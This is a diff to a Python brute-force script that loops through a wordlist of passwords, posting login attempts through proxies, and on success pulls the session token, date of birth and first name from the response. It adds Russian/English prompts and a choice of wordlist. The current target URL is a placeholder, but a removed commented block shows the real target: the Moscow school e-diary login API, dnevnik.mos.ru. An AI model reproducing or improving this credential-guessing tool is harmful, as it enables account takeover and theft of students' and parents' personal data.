@@ -22,8 +22,19 @@ proxies = {
 def bruteforce(mode, login):
     if mode == "know login":
         clear()
-        print(f"[+] Атака на {login} началась")
-        passwords = open("./slovar.txt", "r", encoding="utf-8").readlines()
+        if version == 1:
+            slovar = int(input("1) Использовать Ваш собственный словарь\n2) Использовать наш словарь"))
+        else:
+            slovar = int(input("1) Use your own dictionary\n2) Use our dictionary"))
+        if slovar == 1:
+            slovar = "./slovar.txt"
+        else: 
+            slovar = "./our_slovar.txt"
+        if version == 1:
+            print(f"[+] Атака на {login} началась")
+        else:
+            print(f"[+] Login attack started on {login}")
+        passwords = open(slovar, "r", encoding="utf-8").readlines()
         if passwords != "":
             for password in passwords:
                 res = requests.post("https://jsonplaceholder.typicode.com/posts", json={
@@ -33,10 +44,16 @@ def bruteforce(mode, login):
                 
                 
                 if res.status_code != 200:
-                    print("[-] Пароль " + password + " не подходит!\n")
+                    if version == 1:
+                        print("[-] Пароль " + password + " не подходит!\n")
+                    else:
+                        print("[-] password " + password + " does not fit!\n")
                     
                 elif res.status_code == 200:
-                    print("[+] Пароль {password} подошел!")
+                    if version == 1:
+                        print("[+] Пароль " + password + " подошел!")
+                    else:
+                        print("[-] Passowrd " + password + " came up!")
                     token = res.json().authentication_token
                     date = res.json().date_of_birth
                     first_name = res.json().first_name
@@ -70,7 +87,10 @@ def bruteforce(mode, login):
                 "login": login,
                 "password_plain": password
             })
-            print("[+] Запрос отправлен")
+            if version == 1:
+                print("[+] Запрос отправлен")
+            else:
+                print("[+] Request has been sent")
                           
 def clear():
     if os.name == "nt":
@@ -129,10 +149,3 @@ def option_check():
 clear()
 language()
 menu()
-
-#res = requests.post("https://dnevnik.mos.ru/lms/api/sessions", json={
-#    "login": "jusuf-zadeaf",
-#    "password_plain": "jusuf-zadeaf"
-#})
-
-#print(res.json())
